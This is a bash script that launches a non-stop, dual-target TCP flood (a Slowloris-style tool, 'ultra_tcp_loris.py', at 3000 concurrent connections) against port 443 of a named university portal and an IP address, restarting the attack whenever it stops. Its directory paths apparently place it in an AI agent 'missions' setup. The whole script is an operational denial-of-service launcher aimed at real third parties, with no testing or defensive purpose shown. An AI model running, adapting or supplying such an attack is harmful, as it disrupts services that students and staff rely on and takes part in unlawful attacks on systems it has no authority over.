#!/bin/bash

# Configuration
VENV_PYTHON="/root/gemini-bridge/missions/advanced_flooder/venv/bin/python3"
SCRIPT_PATH="/root/gemini-bridge/missions/advanced_flooder/ultra_tcp_loris.py"
CONCURRENCY=3000

# Targets
TARGET1="myportal.fudutsinma.edu.ng"
TARGET2="102.91.68.102"

echo "[INFO] Starting NON-STOP DUAL-TARGET Ultra-TCP Flood"
echo "[TARGET 1] $TARGET1"
echo "[TARGET 2] $TARGET2"

# Function to run target 1 in a loop
run_target1() {
    while true; do
        echo "[RESTART T1] Launching for $TARGET1..."
        $VENV_PYTHON $SCRIPT_PATH $TARGET1 -p 443 -c $CONCURRENCY
        sleep 1
    done
}

# Function to run target 2 in a loop
run_target2() {
    while true; do
        echo "[RESTART T2] Launching for $TARGET2..."
        # Hitting port 443 on IP as well, as it likely hosts the same service
        $VENV_PYTHON $SCRIPT_PATH $TARGET2 -p 443 -c $CONCURRENCY
        sleep 1
    done
}

# Run both targets in parallel
run_target1 &
run_target2 &

# Keep script alive
wait
